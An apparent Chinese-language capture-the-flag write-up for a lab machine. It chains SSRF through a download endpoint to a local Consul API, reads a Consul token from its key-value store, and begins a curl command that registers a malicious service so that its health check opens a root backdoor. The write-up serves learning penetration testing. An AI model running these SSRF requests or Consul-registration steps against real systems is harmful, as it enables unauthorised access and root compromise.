Phase 1

立足点：SSRF → Consul → RCE

发现 SSRF

/download 端点接受 URL 参数用于文件导出。通过 Burp 修改 URL 指向内网：

GET /download?filename=http://127.0.0.1:8500/v1/agent/self
→ Consul HTTP API 响应（含配置信息）
🧒 儿童版 — 借刀访问（借服务器当快递员）网站有个"下载"功能，本来是下载文件的。我们把下载地址改成内网地址 http://127.0.0.1:8500——服务器乖乖帮我们去访问，再把结果返回来。服务器变成了我们的快递员，帮我们进入本来访问不了的内网。

通过 SSRF 读取 Consul KV 存储

GET /download?filename=http://127.0.0.1:8500/v1/kv/?recurse
"Key": "consul/config"
"Value": "base64 解码后含 Consul Token"

Phase 3

权限提升：Consul 恶意服务注册

ralph@heal:~$ ss -tlnp | grep 8500
127.0.0.1:8500  ← Consul 以 root 运行
🧒 儿童版 — 注册假诊所，体检时搞事Consul 是一个"服务登记中心"——你可以注册一个新"服务"，并设置"健康检查"（定期执行命令看服务是否正常）。我们注册了一个假服务，健康检查命令不是"检查心跳"，而是"给我开后门"。Consul 以 root 身份执行健康检查——后门就以 root 权限打开了。
$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register \

附录

知识点总结

SSRF 是内网的钥匙。

任何接受 URL 参数的端点（下载、导出、预览、Webhook）都值得尝试 SSRF。指向 127.0.0.1 的常见端口（8500 Consul、3000 Gitea、6379 Redis 等）。

Consul 提权是经典模式。

有 Token → 注册恶意服务 → 健康检查以 Consul 进程权限（通常 root）执行。这台是第二次见到了（Ambassador 也用了 Consul）。

密码复用贯穿全程。

Gitea 配置密码 → LimeSurvey 后台。数据库 bcrypt 破解密码 → SSH。每拿到一个密码，横向尝试所有服务。

SSRF → Consul KV→LimeSurvey DB → bcrypt → SSH→Consul 恶意服务 → root
